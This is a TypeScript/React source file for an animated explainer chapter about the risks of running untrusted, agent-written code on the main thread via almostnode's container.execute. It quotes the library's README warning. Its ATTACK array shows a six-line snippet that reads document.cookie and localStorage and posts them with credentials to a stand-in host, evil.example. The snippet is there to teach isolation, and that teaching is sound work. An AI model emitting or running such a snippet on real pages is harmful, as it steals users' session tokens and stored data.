// Explained: The Sandbox — chapter 1: what "running untrusted code" means.
// Grounded in the REAL almostnode code: the README's own security warning and
// the createContainer / container.execute main-thread path. The toy attack is
// a real snippet an agent could emit — it reads document.cookie, localStorage,
// and issues a credentialed fetch. On the unsandboxed main-thread path every
// one of those reaches the host page; the whole book is about moving that same
// snippet somewhere it reaches nothing.
import {
  CAMERA_HOME,
  Camera,
  Player,
  STAGE_H,
  STAGE_W,
  Timeline,
  cameraInterp,
  colors,
  ease,
} from '../../core';
import type {
  CameraState,
  ChannelRef,
  SceneState,
  TimelineOverrides,
} from '../../core';
import overrides from './overrides.json';

// ---------------------------------------------------------------------------
// The capability reach of the toy attack on the unsandboxed path (real facts:
// same-origin main-thread eval sees the page's globals).
// ---------------------------------------------------------------------------

const REACH = [
  { target: 'document.cookie', hit: true, note: 'session token' },
  { target: 'localStorage', hit: true, note: 'auth state, drafts' },
  { target: 'IndexedDB', hit: true, note: 'cached user data' },
  { target: 'fetch(…, {credentials})', hit: true, note: 'acts as you' },
  { target: 'the DOM', hit: true, note: 'reads + rewrites the page' },
];

const ATTACK = [
  "// an agent-authored snippet — looks harmless",
  "const t = document.cookie;",
  "const s = JSON.stringify(localStorage);",
  "fetch('https://evil.example/collect', {",
  "  method: 'POST', credentials: 'include',",
  "  body: t + s });",
];

const CAM_ATTACK: CameraState = { x: 470, y: 340, k: 1.16 };
const CAM_REACH: CameraState = { x: 720, y: 360, k: 1.14 };

interface Scene {
  tl: Timeline;
  cam: ChannelRef<CameraState>;
  titleU: ChannelRef<number>;
  pageU: ChannelRef<number>; // the host page with its secrets
  codeU: ChannelRef<number>; // the attack snippet types on
  runU: ChannelRef<number>; // createContainer().execute path
  reachU: ChannelRef<number>; // the reach matrix
  warnU: ChannelRef<number>; // the README warning
  dimU: ChannelRef<number>;
  closeU: ChannelRef<number>;
}

export function buildScene(): Scene {
  const tl = new Timeline();
  const cam = tl.channel<CameraState>('cam', CAMERA_HOME, cameraInterp);
  const titleU = tl.channel('titleU', 0);
  const pageU = tl.channel('pageU', 0);
  const codeU = tl.channel('codeU', 0);
  const runU = tl.channel('runU', 0);
  const reachU = tl.channel('reachU', 0);
  const warnU = tl.channel('warnU', 0);
  const dimU = tl.channel('dimU', 0);
  const closeU = tl.channel('closeU', 0);

  // Beat 1 — the setup
  tl.caption({
    at: 0.5,
    dur: 5.6,
    text: 'We build agents that write code and then run it. That sentence hides a knife: running code an agent wrote means running code you did not. This shelf has a repository that runs a whole node runtime inside one browser tab — call it almostnode — and it is the perfect place to ask what untrusted really costs.',
  });
  tl.tween(titleU, 1, { at: 0.4, dur: 0.8, ease: ease.enter });
  tl.tween(pageU, 1, { at: 1.6, dur: 1.0, ease: ease.enter });
  tl.caption({
    at: 6.9,
    dur: 5.2,
    text: 'Here is your page. It is not empty — it holds a session cookie, a full local storage, a cached database, and the power to make requests as you. Everything a login protects lives right here, in the same tab.',
  });
  tl.tween(cam, CAM_REACH, { at: 7.2, dur: 1.3, ease: ease.move });
  tl.tween(reachU, 0.35, { at: 8.0, dur: 1.0, ease: ease.enter });
  tl.hold(12.1, 0.6);

  // Beat 2 — the attack
  tl.caption({
    at: 12.7,
    dur: 5.8,
    text: 'Now the agent hands you this. Six lines, unremarkable at a glance — grab the cookie, serialize local storage, post it to a server you have never heard of. No exploit, no cleverness. Just ordinary browser calls, used honestly.',
  });
  tl.tween(cam, CAM_ATTACK, { at: 13.0, dur: 1.3, ease: ease.move });
  tl.tween(codeU, 1, { at: 13.6, dur: 2.8, ease: ease.linear });
  tl.hold(18.5, 0.6);

  // Beat 3 — run it the easy way
  tl.caption({
    at: 19.1,
    dur: 5.8,
    text: 'almostnode offers a tempting shortcut. Make a container, call execute, and the code runs immediately — no setup, full speed. It runs on the main thread, in your page, with your page’s eyes. Watch what the snippet can touch.',
  });
  tl.tween(runU, 1, { at: 20.2, dur: 1.0, ease: ease.enter });
  tl.tween(cam, CAM_REACH, { at: 21.0, dur: 1.3, ease: ease.move });
  tl.tween(reachU, 1, { at: 22.0, dur: 2.4, ease: ease.linear });
  tl.caption({
    at: 25.5,
    dur: 5.4,
    text: 'Every line lights up. The cookie, storage, the cached database, credentialed fetch, the page itself — all reachable, because same origin means same everything. The snippet did not break in. It was already inside.',
  });
  tl.hold(30.9, 0.6);

  // Beat 4 — the real warning
  tl.caption({
    at: 31.5,
    dur: 5.8,
    text: 'And almostnode says so, in its own read-me file, in bold. Do not use container execute with untrusted code. It runs on the main thread with full access to your page. The fast path is documented as the dangerous one — on purpose.',
  });
  tl.tween(cam, CAMERA_HOME, { at: 31.8, dur: 1.3, ease: ease.move });
  tl.tween(warnU, 1, { at: 33.0, dur: 0.9, ease: ease.enter });
  tl.caption({
    at: 37.9,
    dur: 5.2,
    text: 'This is the whole problem stated once. Untrusted code is not code that might be buggy — it is code whose author’s interests are not yours, running with your authority. Isolation is the art of subtracting that authority.',
  });
  tl.hold(43.1, 0.6);

  // Beat 5 — close
  tl.caption({
    at: 43.7,
    dur: 5.4,
    text: 'So the rest of this book removes the authority, one wall at a time. And it starts with a wall the browser already built for us, decades ago, for exactly this fight — the same-origin policy. That is next.',
  });
  tl.tween(dimU, 1, { at: 44.5, dur: 1.2, ease: ease.move });
  tl.tween(closeU, 1, { at: 45.7, dur: 1.0, ease: ease.enter });
  tl.hold(49.1, 1.4);

  return { tl, cam, titleU, pageU, codeU, runU, reachU, warnU, dimU, closeU };
}

const scene = buildScene();
scene.tl.applyOverrides(overrides as TimelineOverrides);
const MOTION = {
  file: 'src/viz/explainers/untrusted-code/overrides.json',
  slug: 'untrusted-code',
};

const clamp01 = (u: number): number => (u < 0 ? 0 : u > 1 ? 1 : u);

function Frame({ s }: { s: SceneState }) {
  const cam = s.get(scene.cam);
  const titleU = s.get(scene.titleU);
  const pageU = s.get(scene.pageU);
  const codeU = s.get(scene.codeU);
  const runU = s.get(scene.runU);
  const reachU = s.get(scene.reachU);
  const warnU = s.get(scene.warnU);
  const dimU = s.get(scene.dimU);
  const closeU = s.get(scene.closeU);

  const mainOp = 1 - 0.85 * dimU;

  return (
    <>
      <rect width={STAGE_W} height={STAGE_H} fill={colors.BG} />

      <g opacity={mainOp}>
        <Camera {...cam}>
          {/* the host page */}
          {pageU > 0 && (
            <g opacity={pageU * (1 - 0.6 * clamp01(codeU * 2) * (1 - runU))}>
              <rect x={560} y={180} width={360} height={360} rx={14} fill={colors.PANEL} opacity={0.5} stroke={colors.ACCENT} strokeWidth={1.5} />
              <text x={584} y={210} fill={colors.ACCENT} fontSize={14} fontWeight={700}>
                your page (one origin)
              </text>
              {REACH.map((r, i) => {
                const lit = clamp01(reachU * REACH.length - i);
                const y = 244 + i * 56;
                return (
                  <g key={r.target}>
                    <rect x={584} y={y} width={312} height={44} rx={8} fill={colors.PANEL} opacity={0.9} stroke={lit > 0.5 ? colors.NEGATIVE : colors.GRID} strokeWidth={lit > 0.5 ? 2 : 1} />
                    <text x={602} y={y + 20} fill={colors.TEXT} fontSize={12.5} fontFamily="monospace">
                      {r.target}
                    </text>
                    <text x={602} y={y + 37} fill={colors.MUTED} fontSize={10.5}>
                      {r.note}
                    </text>
                    {lit > 0.5 && (
                      <text x={872} y={y + 26} textAnchor="end" fill={colors.NEGATIVE} fontSize={15} fontWeight={700} opacity={clamp01(lit * 2 - 1)}>
                        ✗
                      </text>
                    )}
                  </g>
                );
              })}
            </g>
          )}

          {/* the attack snippet */}
          {codeU > 0 && runU < 0.5 && (
            <g opacity={codeU * (1 - clamp01(runU * 2))}>
              <rect x={180} y={200} width={470} height={200} rx={12} fill={colors.PANEL} opacity={0.97} stroke={colors.NEGATIVE} />
              <text x={204} y={230} fill={colors.NEGATIVE} fontSize={13} fontWeight={700}>
                untrusted snippet
              </text>
              {ATTACK.map((ln, i) => {
                const u = clamp01(codeU * ATTACK.length - i);
                if (u <= 0) return null;
                return (
                  <text key={i} x={204} y={258 + i * 24} fill={i === 0 ? colors.MUTED : colors.TEXT} fontSize={12} fontFamily="monospace" opacity={u}>
                    {ln}
                  </text>
                );
              })}
            </g>
          )}

          {/* the run path */}
          {runU > 0 && (
            <g opacity={runU}>
              <rect x={180} y={470} width={430} height={62} rx={10} fill={colors.PANEL} opacity={0.95} stroke={colors.WARM} />
              <text x={204} y={498} fill={colors.WARM} fontSize={12.5} fontFamily="monospace" fontWeight={700}>
                createContainer().execute(snippet)
              </text>
              <text x={204} y={519} fill={colors.MUTED} fontSize={11.5}>
                main thread · same origin · full page access
              </text>
              <line x1={610} y1={500} x2={556} y2={360} stroke={colors.NEGATIVE} strokeWidth={2} strokeDasharray="6 5" opacity={0.7} />
            </g>
          )}
        </Camera>
      </g>

      {/* the README warning — screen space */}
      {warnU > 0 && (
        <g opacity={warnU * mainOp}>
          <rect x={210} y={200} width={860} height={130} rx={14} fill={colors.PANEL} opacity={0.97} stroke={colors.NEGATIVE} strokeWidth={2} />
          <text x={240} y={240} fill={colors.NEGATIVE} fontSize={15} fontWeight={700}>
            ⚠ from almostnode’s own README
          </text>
          <text x={240} y={274} fill={colors.TEXT} fontSize={14.5} fontFamily="monospace">
            “Do not use createContainer() or container.execute() with untrusted code.”
          </text>
          <text x={240} y={304} fill={colors.MUTED} fontSize={13}>
            “The example runs code on the main thread with full access to your page.”
          </text>
        </g>
      )}

      <g opacity={titleU * mainOp}>
        <text x={40} y={44} fill={colors.TEXT} fontSize={24} fontWeight={600}>
          Code you didn’t write
        </text>
      </g>

      {/* close */}
      {closeU > 0 && (
        <g opacity={closeU}>
          <rect x={200} y={210} width={880} height={240} rx={16} fill={colors.PANEL} opacity={0.96} stroke={colors.GRID} />
          <text x={640} y={272} textAnchor="middle" fill={colors.TEXT} fontSize={24} fontWeight={600}>
            Untrusted = someone else’s interests, your authority.
          </text>
          <text x={640} y={322} textAnchor="middle" fill={colors.MUTED} fontSize={15} fontFamily="monospace">
            same origin → cookie · storage · IndexedDB · credentialed fetch · the DOM
          </text>
          <text x={640} y={362} textAnchor="middle" fill={colors.POSITIVE} fontSize={15.5}>
            isolation is the art of subtracting authority
          </text>
          <text x={640} y={410} textAnchor="middle" fill={colors.WARM} fontSize={14}>
            next: the wall the browser already built — the same-origin policy
          </text>
        </g>
      )}
    </>
  );
}

export function UntrustedCode() {
  return (
    <div style={{ padding: '4vh 4vw' }}>
      <Player timeline={scene.tl} loop motion={MOTION}>
        {(s) => <Frame s={s} />}
      </Player>
    </div>
  );
}

export { Frame as Render };
export const vizScene = () => scene;
